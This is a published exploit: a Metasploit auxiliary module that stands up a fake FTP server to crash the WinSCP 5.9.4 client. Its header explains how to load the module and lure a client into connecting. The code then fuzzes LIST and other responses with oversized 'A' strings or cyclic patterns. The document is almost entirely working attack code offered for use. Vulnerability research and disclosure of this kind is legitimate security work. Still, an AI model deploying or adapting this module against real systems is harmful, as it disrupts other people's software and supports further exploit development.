# Exploit Title: WinSCP 5.9.4 - (LIST) Command Denial of service (Crush application)
  
# Date: [4-4-2017] mm.dd.yy
# Exploit Author: [M.Ibrahim]  vulnbug@gmail.com
# E-Mail:  vulnbug  <at>  gmail.com
# Vendor Home Page: https://winscp.net/eng/index.php
# Vendor download link: https://winscp.net/download/WinSCP-5.9.4-Setup.exe
# Version: [WinSCP 5.9.4] 
# Tested on: windows 7 x86
##
#put the file winSCP 5.9.4.rb in metasploit framework folder name exploit then write this command to refresh all module in metasploit ==> reload_all
#then run -j 
#now fake ftp server is ready 
#try to connect to this fake ftp server with winscp client and it will crush
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
  include Exploit::Remote::TcpServer
 
  def initialize()
    super(
      &#039;Name&#039;           => &#039;WinSCP CRUSHER&#039;,
      &#039;Description&#039;    => %q{
        This module will Crush WinSCP FTP client 
      },
      &#039;Author&#039;         => [ &#039;M.Ibrahim <vulnbug[at]gmail.com>&#039; ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://www.google.com&#039; ],
        ]
      )
    register_options(
      [
      OptPort.new(&#039;SRVPORT&#039;, [ true, "The local port to listen on.", 21 ]),
      OptString.new(&#039;FUZZCMDS&#039;, [ true, "The FTP client server Command to crush.", "LIST", nil, /(?:[A-Z]+,?)+/ ]),
      OptInt.new(&#039;STARTSIZE&#039;, [ true, "Crush string startsize.",2000]),
      OptInt.new(&#039;ENDSIZE&#039;, [ true, "Max Fuzzing string size.",200000]),
      OptInt.new(&#039;STEPSIZE&#039;, [ true, "Increment fuzzing string each attempt.",1000]),
      OptBool.new(&#039;RESET&#039;, [ true, "Reset fuzzing values after client disconnects with QUIT cmd.",true]),
      OptString.new(&#039;WELCOME&#039;, [ true, "Fake FTP Server welcome message.","FTP WinSCP server CRusher"]),
      OptBool.new(&#039;CYCLIC&#039;, [ true, "Use Cyclic pattern instead of A&#039;s .",false]),
      OptBool.new(&#039;ERROR&#039;, [ true, "Reply with error codes only",false]),
      OptBool.new(&#039;EXTRALINE&#039;, [ true, "Add extra CRLF&#039;s in response to LIST",true])
      ], self.class)
  end
 
   
 
  def support_ipv6?
    false
  end
 
  def setup
    super
    @state = {}
  end
 
  def run
    @fuzzsize=datastore[&#039;STARTSIZE&#039;].to_i
    exploit()
  end
 
   
  def on_client_connect(c)
    @state[c] = {
      :name => "#{c.peerhost}:#{c.peerport}",
      :ip   => c.peerhost,
      :port => c.peerport,
      :user => nil,
      :pass => nil
    }
     
    print_status("Client connected : " + c.peerhost)
    active_data_port_for_client(c, 20)
    send_response(c,"","WELCOME",220," "+datastore[&#039;WELCOME&#039;])
     
  end
 
  def on_client_close(c)
    @state.delete(c)
  end
 
   
  def passive_data_port_for_client(c)
    @state[c][:mode] = :passive
    if(not @state[c][:passive_sock])
      s = Rex::Socket::TcpServer.create(
        &#039;LocalHost&#039; => &#039;0.0.0.0&#039;,
        &#039;LocalPort&#039; => 0,
        &#039;Context&#039;   => { &#039;Msf&#039; => framework, &#039;MsfExploit&#039; => self }
      )
      dport = s.getsockname[2]
      @state[c][:passive_sock] = s
      @state[c][:passive_port] = dport
       
    end
    @state[c][:passive_port]
  end
 
 
  def active_data_port_for_client(c,port)
    @state[c][:mode] = :active
    connector = Proc.new {
      host = c.peerhost.dup
      sock = Rex::Socket::Tcp.create(
        &#039;PeerHost&#039; => host,
        &#039;PeerPort&#039; => port,
        &#039;Context&#039;   => { &#039;Msf&#039; => framework, &#039;MsfExploit&#039; => self }
      )
    }
    @state[c][:active_connector] = connector
    @state[c][:active_port]      = port
    
  end
 
 
  def establish_data_connection(c)
     
    begin
    Timeout.timeout(20) do
      if(@state[c][:mode] == :active)
        return @state[c][:active_connector].call()
      end
      if(@state[c][:mode] == :passive)
        return @state[c][:passive_sock].accept
      end
    end
     
    rescue ::Exception => e
      print_error("Failed to establish data connection: #{e.class} #{e}")
    end
    nil
  end
 
   
  def on_client_data(c)
 
    data = c.get_once
    return if not data
 
    cmd,arg = data.strip.split(/\s+/, 2)
    arg ||= ""
 
    return if not cmd
 
    case cmd.upcase.strip
 
    when &#039;USER&#039;
      @state[c][:user] = arg
      send_response(c,arg,"USER",331," User name okay, need password")
      return
 
    when &#039;PASS&#039;
      @state[c][:pass] = arg
      send_response(c,arg,"PASS",230,"-Password accepted.\r\n230 User logged in.")
      return
 
    when &#039;QUIT&#039;
      if (datastore[&#039;RESET&#039;])
        print_status("Resetting fuzz settings")
        @fuzzsize = datastore[&#039;STARTSIZE&#039;]
        @stepsize = datastore[&#039;STEPSIZE&#039;]
      end
      print_status("** Client disconnected **")
      send_response(c,arg,"QUIT",221," User logged out")
      return
 
    when &#039;SYST&#039;
      send_response(c,arg,"SYST",215," UNIX Type: L8")
      return
 
    when &#039;TYPE&#039;
      send_response(c,arg,"TYPE",200," Type set to #{arg}")
      return
 
    when &#039;CWD&#039;
      send_response(c,arg,"CWD",250," CWD Command successful")
      return
 
    when &#039;PWD&#039;
      send_response(c,arg,"PWD",257," \"/\" is current directory.")
      return
 
    when &#039;REST&#039;
      send_response(c,arg,"REST",200," OK")
      return
 
    when &#039;XPWD&#039;
      send_response(c,arg,"PWD",257," \"/\" is current directory")
      return
 
    when &#039;SIZE&#039;
      send_response(c,arg,"SIZE",213," 1")
      return
 
    when &#039;MDTM&#039;
      send_response(c,arg,"MDTM",213," #{Time.now.strftime("%Y%m%d%H%M%S")}")
      return
 
    when &#039;CDUP&#039;
      send_response(c,arg,"CDUP",257," \"/\" is current directory")
      return
 
    when &#039;PORT&#039;
      port = arg.split(&#039;,&#039;)[4,2]
      if(not port and port.length == 2)
        c.put("500 Illegal PORT command.\r\n")
        return
      end
      port = port.map{|x| x.to_i}.pack(&#039;C*&#039;).unpack(&#039;n&#039;)[0]
      active_data_port_for_client(c, port)
      send_response(c,arg,"PORT",200," PORT command successful")
      return
 
    when &#039;PASV&#039;
 
      daddr = Rex::Socket.source_address(c.peerhost)
      dport = passive_data_port_for_client(c)
      @state[c][:daddr] = daddr
      @state[c][:dport] = dport
      pasv  = (daddr.split(&#039;.&#039;) + [dport].pack(&#039;n&#039;).unpack(&#039;CC&#039;)).join(&#039;,&#039;)
      dofuzz = fuzz_this_cmd("PASV")
      code = 227
      if datastore[&#039;ERROR&#039;]
        code = 557
      end
      if (dofuzz==1)
 
        send_response(c,arg,"PASV",code," Entering Passive Mode (#{@fuzzdata},1,1,1,1,1)\r\n")
        incr_fuzzsize()
      else
        send_response(c,arg,"PASV",code," Entering Passive Mode (#{pasv})")
      end
      return
 
    when /^(LIST|NLST|LS)$/
 
 
      conn = establish_data_connection(c)
      if(not conn)
        c.put("425 Can&#039;t build data connection\r\n")
        return
      end
 
      code = 150
      if datastore[&#039;ERROR&#039;]
        code = 550
      end
      c.put("#{code} Here comes the directory listing.\r\n")
      code = 226
      if datastore[&#039;ERROR&#039;]
        code = 550
      end
      c.put("#{code} Directory send ok.\r\n")
      strfile = "passwords.txt"
      strfolder = "Secret files"
      dofuzz = fuzz_this_cmd("LIST")
      if (dofuzz==1)
        strfile = @fuzzdata + ".txt"
        strfolder = @fuzzdata
        paylen = @fuzzdata.length
 
        incr_fuzzsize()
      end
 
      dirlist = ""
      if datastore[&#039;EXTRALINE&#039;]
        extra = "\r\n"
      else
        extra = ""
      end
      dirlist = "drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{strfolder}\r\n" + extra
      dirlist << "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{strfile}\r\n" + extra
      conn.put("total 2\r\n"+dirlist)
      conn.close
      return
 
    when &#039;RETR&#039;
 
 
      conn = establish_data_connection(c)
      if(not conn)
        c.put("425 Can&#039;t build data connection\r\n")
        return
      end
      print_status(" - Data connection set up")
      strcontent = "blahblahblah"
      dofuzz = fuzz_this_cmd("LIST")
      if (dofuzz==1)
        strcontent = @fuzzdata
        paylen = @fuzzdata.length
 
        incr_fuzzsize()
      end
      c.put("150 Opening BINARY mode data connection #{strcontent}\r\n")
      print_status(" - Sending data via data connection")
      conn.put(strcontent)
      c.put("226 Transfer complete\r\n")
      conn.close
      return
 
    when /^(STOR|MKD|REM|DEL|RMD)$/
      send_response(c,arg,cmd.upcase,500," Access denied")
      return
 
    when &#039;FEAT&#039;
      send_response(c,arg,"FEAT","","211-Features:\r\n211 End")
      return
 
    when &#039;HELP&#039;
      send_response(c,arg,"HELP",214," Syntax: #{arg} - (#{arg}-specific commands)")
 
    when &#039;SITE&#039;
      send_response(c,arg,"SITE",200," OK")
      return
 
    when &#039;NOOP&#039;
      send_response(c,arg,"NOOP",200," OK")
      return
 
    when &#039;ABOR&#039;
      send_response(c,arg,"ABOR",225," Abor command successful")
      return
 
    when &#039;ACCT&#039;
      send_response(c,arg,"ACCT",200," OK")
      return
 
    when &#039;RNFR&#039;
      send_response(c,arg,"RNRF",350," File exists")
      return
 
    when &#039;RNTO&#039;
      send_response(c,arg,"RNTO",350," File exists")
      return
    else
      send_response(c,arg,cmd.upcase,200," Command not understood")
      return
    end
    return
  end
 
 
 
 
  def fuzz_this_cmd(cmd)
    @fuzzcommands = datastore[&#039;FUZZCMDS&#039;].split(",")
    fuzzme = 0
    @fuzzcommands.each do |thiscmd|
      if ((cmd.upcase == thiscmd.upcase) || (thiscmd=="*")) && (fuzzme==0)
        fuzzme = 1
      end
    end
    if fuzzme==1
 
      if datastore[&#039;CYCLIC&#039;]
        @fuzzdata = Rex::Text.pattern_create(@fuzzsize)
      else
        @fuzzdata = "A" * @fuzzsize
      end
    end
    return fuzzme
  end
 
  def incr_fuzzsize
    @stepsize = datastore[&#039;STEPSIZE&#039;].to_i
    @fuzzsize = @fuzzsize + @stepsize
 
    if (@fuzzsize > datastore[&#039;ENDSIZE&#039;].to_i)
      @fuzzsize = datastore[&#039;ENDSIZE&#039;].to_i
    end
  end
 
 
 
  def send_response(c,arg,cmd,code,msg)
    if arg.length > 40
      showarg = arg[0,40] + "..."
    else
      showarg = arg
    end
    if cmd.length > 40
      showcmd = cmd[0,40] + "..."
    else
      showcmd = cmd
    end
 
    dofuzz = fuzz_this_cmd(cmd)
 
    if (dofuzz==1) && (cmd.upcase != "PASV")
      paylen = @fuzzdata.length
 
      if datastore[&#039;ERROR&#039;]
        code = "550 "
      end
      if cmd=="FEAT"
        @fuzzdata = "211-Features:\r\n "+@fuzzdata+"\r\n211 End"
      end
      if cmd=="PWD"
        @fuzzdata = "  \"/"+@fuzzdata+"\" is current directory"
      end
      cmsg = code.to_s + " " + @fuzzdata
      c.put("#{cmsg}\r\n")
      print_status("* Fuzz data sent")
      incr_fuzzsize()
    else
      
      cmsg = code.to_s + msg
      cmsg = cmsg.strip
      c.put("#{cmsg}\r\n")
    end
    return
  end
end

